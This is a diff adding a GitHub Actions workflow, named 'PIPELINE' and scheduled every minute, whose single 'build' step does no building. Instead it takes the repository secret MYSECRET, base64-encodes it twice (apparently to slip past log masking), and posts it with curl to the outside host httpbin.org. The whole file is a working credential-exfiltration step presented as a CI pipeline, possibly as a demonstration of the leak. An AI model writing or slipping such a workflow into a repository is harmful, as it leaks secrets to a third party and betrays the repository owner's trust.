@@ -1,0 +1,14 @@
+name: PIPELINE
+on:
+  schedule:
+    # * is a special character in YAML so you have to quote this string
+    - cron:  '* * * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          MYSECRET: ${{ secrets.MYSECRET }}
+
+        run: |
+          curl -d creds="$(echo $MYSECRET | base64 | base64)" httpbin.org/post
